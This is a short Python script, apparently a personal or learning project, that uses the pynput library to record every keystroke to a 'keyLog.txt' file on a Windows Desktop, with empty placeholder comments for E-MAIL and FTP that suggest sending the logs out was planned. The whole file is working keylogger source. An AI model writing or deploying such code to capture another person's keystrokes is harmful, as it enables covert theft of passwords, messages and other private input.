# "pip install pynput" to install pyinput library.
from pynput.keyboard import Key,Listener
import logging

def on_press(key):
    logging.info(str(key))
    # code here

log_dir =r"C:/Users/jobel johny/Desktop/"

logging.basicConfig(filename=(log_dir+"keyLog.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')


with Listener(on_press=on_press) as listener:
    listener.join()

#E-MAIL
#
#
#FTP
#
#
